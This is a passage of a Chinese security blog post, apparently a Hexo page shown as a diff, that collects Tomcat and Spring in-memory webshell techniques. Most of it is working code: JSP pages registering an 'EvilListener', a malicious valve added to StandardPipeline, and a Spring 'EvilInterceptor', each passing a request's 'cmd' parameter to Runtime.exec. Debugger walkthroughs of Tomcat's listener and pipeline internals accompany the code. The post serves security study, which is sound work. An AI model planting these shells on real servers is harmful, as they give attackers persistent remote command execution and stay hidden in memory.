context.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//FilterConfig</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(c </span><br><span class="line">    <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map)field1.get(context);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;EvilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//FilterMap</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;EvilFilter&quot;</span>);</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    context.addFilterMap(filterMap);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>效果如下</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/filter13.png" class>
+<h4 id="内存马实现listener">7.内存马实现——listener</h4>
+<h5 id="前置知识-1">7.1前置知识</h5>
+<h6 id="关于listener">关于listener</h6>
+<p>参考文章：https://www.cnblogs.com/LittleHann/p/17722536.html#_label1</p>
+<p>在tomcat当中，处理一个http请求的基本流程如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context-param &gt; listener &gt; filter &gt; servlet</span><br></pre></td></tr></table></figure>
+<p>listener同时也是满足servlet规范的一个组件。</p>
+<p>其实我们也可以从StandarContext#startInternal中找到对应的调用顺序:</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener1.png" class>
+<p>listener是web三大组件之一，是servlet监听器，用来监听请求，监听服务端的操作。负责对Context、Session、Request、参数等创建、销毁变化的监听，可以添加上对应动作。</p>
+<p>JJava中总共有8个Listener，不同的Listener有不同的生命周期，其大致可分为3类如下：</p>
+<ul>
+<li>生命周期监听器
+<ul>
+<li>ServletContextListener
+<ul>
+<li>requestInitialized
+在容器启动时被调用（在servlet被实例化前执行）</li>
+<li>requestDestroyed 在容器销毁时调用（在servlet被销毁后执行）</li>
+</ul></li>
+<li>HttpSessionListener
+<ul>
+<li>sessionCreated 在HttpSession创建后调用</li>
+<li>sessionDestroyed
+在HttpSession销毁前调用（执行session.invalidate();方法）</li>
+</ul></li>
+<li>ServletRequestListener
+<ul>
+<li>requestInitialized 在request对象创建后调用（发起请求）</li>
+<li>requestDestroyed 在request对象销毁前调用（请求结束）</li>
+</ul></li>
+</ul></li>
+<li>属性变化监听器
+<ul>
+<li>HttpSessionAttributeListener
+<ul>
+<li>attributeAdded(HttpSessionBindingEvent event)</li>
+<li>attributeRemoved(HttpSessionBindingEvent event)</li>
+<li>attributeReplaced(HttpSessionBindingEvent event)</li>
+</ul></li>
+<li>ServletRequestAttributeListener
+<ul>
+<li>attributeAdded(ServletRequestAttributeEvent event)</li>
+<li>attributeRemoved(ServletRequestAttributeEvent event)</li>
+<li>attributeReplaced(ServletRequestAttributeEvent event)</li>
+</ul></li>
+</ul></li>
+<li>session中指定类属性变化监听器
+<ul>
+<li>HttpSessionBindingListener　
+<ul>
+<li>valueBound(HttpSessionBindingEvent event)
+当该类实例设置进session域中时调用</li>
+<li>valueUnbound(HttpSessionBindingEvent event)
+当该类的实例从session域中移除时调用</li>
+</ul></li>
+<li>HttpSessionActivationListener　
+<ul>
+<li>sessionWillPassivate(HttpSessionEvent se)
+当对象session被序列化（钝化）后调用</li>
+<li>sessionDidActivate(HttpSessionEvent se)
+当对象session被反序列化（活化）后调用</li>
+</ul></li>
+</ul></li>
+</ul>
+<p>其中关于监听Request对象的监听器是最适合做内存马的，只要访问服务就能触发操作。</p>
+<p>我们接下来重点分析Request相关接口。</p>
+<p>如果在Tomcat要引入listener，需要实现两种接口，分别是</p>
+<ul>
+<li>LifecycleListener</li>
+<li>EvenListener</li>
+</ul>
+<p>实现了LifecycleListener接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马。</p>
+<p>所以来看另一个EventListener接口，在Tomcat中，自定义了很多继承于EventListener的接口，应用于各个对象的监听。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener2.png" class>
+<p>我们既然要使用关于Request对象的内存马，我们就需要看ServletRequestListener里面的内容，该接口只定义了两个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ServletRequestListener</span> <span class="keyword">extends</span> <span class="title class_">EventListener</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent var1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了搞清楚这两个方法到底是什么时候触发，分别起到了什么作用，为此我们需要自定义编写一个listener。</p>
+<p>listener代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;execute requestDestroy&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;execute requestInitialed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>配置web.xml如下</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.example.TestListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>访问任意的url，就可以触发listener，下图是控制台的输出。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener3.png" class>
+<ul>
+<li>requestInitialized：在request对象创建时触发</li>
+<li>requestDestroyed：在request对象销毁时触发</li>
+</ul>
+<p>我们在requestInitialized执行之前下一个断点，来看调用栈，通过这个我们找到到底是哪一个函数调用的Listener的requestInitialized</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener5.png" class>
+<p>下断点之后，我们可以看到整个函数的调用栈，从这里面就可以很清楚的看到调用情况。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener6.png" class>
+<p>追溯代码的运行过程，回到StandardContext对象里面，看fireRequestInitEvent函数的执行情况。在该函数当中使用StandardContext.getApplicationEventListeners();获取了listener。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener4.png" class>
+<p>按照这个代码往下走，后面会调用requestInitialized方法，但是我们需要知道如何装载listener。往前追溯之后我们发现是通过ApplicationContext#addListener添加的。</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener7.png" class>
+<p>这时候我们往下看调用栈，不难发现里面包含ApplicationContextFacade对象以及ApplicationContext对象。ApplicationContextFacade对象对ApplicationContext进行了封装，而ApplicationContext实例中又包含了StandardContext实例。</p>
+<p>来到ApplicationContext对象的addListener当中发现它最终会调用StandardContext的addApplicationEventListener</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener8.png" class>
+<h5 id="内存马实现-1">7.2内存马实现</h5>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;execute requestDestroy&quot;</span>);</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;execute requestInitialed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line">    context.addApplicationEventListener(<span class="keyword">new</span> <span class="title class_">EvilListener</span>());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/listener9.png" class>
+<h4 id="内存马实现valve">8.内存马实现——valve</h4>
+<p>参考文章：https://www.cnblogs.com/coldridgeValley/p/5816414.html</p>
+<p>之前在tomcat架构简述那篇文章中介绍过，tomcat由<code>Connector</code>和<code>Container</code>两部分组成，而当网络请求过来的时候<code>Connector</code>先将请求包装为<code>Request</code>，然后将<code>Request</code>交由<code>Container</code>进行处理，最终返回给请求方。而<code>Container</code>处理的第一层就是<code>Engine</code>容器，但是在tomcat中<code>Engine</code>容器不会直接调用<code>Host</code>容器去处理请求，那么请求是怎么在4个容器中流转的，4个容器之间是怎么依次调用的，我们今天来讲解下。</p>
+<p>当请求到达<code>Engine</code>容器的时候，<code>Engine</code>并非是直接调用对应的<code>Host</code>去处理相关的请求，而是调用了自己的一个组件去处理，这个组件就叫做<code>pipeline</code>组件,跟<code>pipeline</code>相关的还有个也是容器内部的组件，叫做<code>valve</code>组件。</p>
+<p><code>Pipeline</code>的作用就如其中文意思一样管道，可以把不同容器想象成一个独立的个体，那么<code>pipeline</code>就可以理解为不同容器之间的管道，道路，桥梁。那<code>Valve</code>这个组件是什么东西呢？<code>Valve</code>也可以直接按照字面意思去理解为阀门。<code>pipeline</code>是通道，<code>valve</code>是阀门，他们两有什么关系呢？</p>
+<p>如下图所示，pipeline与valve之间的关系有点像filter与servlet之间的关系</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/valve1.png" class>
+<p>事实上，我们从之前的调用栈中也能够找到关于valve组件的影子</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/valve2.png" class>
+<p>实现一个阀门valve需要实现ValveBase接口，如下所示我们就已经实现了一个valve。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.valves.ValveBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以去看看tomcat当中是怎么注册valve的，在StandardPipeline当中有addvalve方法可以添加valve</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/valve3.png" class>
+<p>在ContainerBase基类里定义了Pipeline:</p>
+<img data-src="/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/valve4.png" class>
+<p>我们的思路很简单，通过ContainerBase获取standardpipeline类，然后从StandardContext里面拿到standardpipeline实例，然后通过addvalve把valve加进去</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestValve</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">                <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">pipeline</span> <span class="operator">=</span> ContainerBase.class.getDeclaredField(<span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">    pipeline.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardPipeline</span> <span class="variable">pipe</span> <span class="operator">=</span> (StandardPipeline) pipeline.get(context);</span><br><span class="line"></span><br><span class="line">    pipe.addValve(<span class="keyword">new</span> <span class="title class_">TestValve</span>());</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>非jsp版本</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.springmvc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.WebApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ModelAndView;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.handler.AbstractHandlerMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/addinterceptor&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptor</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">requestMappingHandlerMapping</span> <span class="operator">=</span> context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> AbstractHandlerMapping.class.getDeclaredField(<span class="string">&quot;adaptedInterceptors&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        List&lt;HandlerInterceptor&gt; adaptedInterceptors = (List&lt;HandlerInterceptor&gt;) f.get(requestMappingHandlerMapping);</span><br><span class="line">        adaptedInterceptors.add(<span class="keyword">new</span> <span class="title class_">EvilInterceptor</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.postHandle(request, response, handler, modelAndView);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        HandlerInterceptor.<span class="built_in">super</span>.afterCompletion(request, response, handler, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="参考文章">参考文章：</h4>
+<p>https://zhuanlan.zhihu.com/p/660749362</p>
+<p>https://blog.csdn.net/shelter1234567/article/details/133435490</p>
+<p>https://xz.aliyun.com/t/7683</p>
+<p>https://zhuanlan.zhihu.com/p/546618658</p>
+<p>https://xz.aliyun.com/t/11003#toc-4</p>
+<p>https://www.cnblogs.com/LittleHann/p/17722536.html#_label1</p>
+<p>https://www.cnblogs.com/coldridgeValley/p/5816414.html</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>f4nx1ng
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://f4nx1ng.github.io/2024/07/28/tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马合集">https://f4nx1ng.github.io/2024/07/28/tomcat内存马/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" rel="tag"># JAVA安全</a>
+              <a href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag"># 内存马</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+            </div>
+            <div class="post-nav-item">
+                <a href="/2024/07/28/hello-world/" rel="next" title="f4nx1ng's blog">
+                  f4nx1ng's blog <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">f4nx1ng</span>
+  </div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.31/fancybox/fancybox.umd.js" integrity="sha256-a+H7FYzJv6oU2hfsfDGM2Ohw/cR9v+hPfxHCLdmCrE8=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
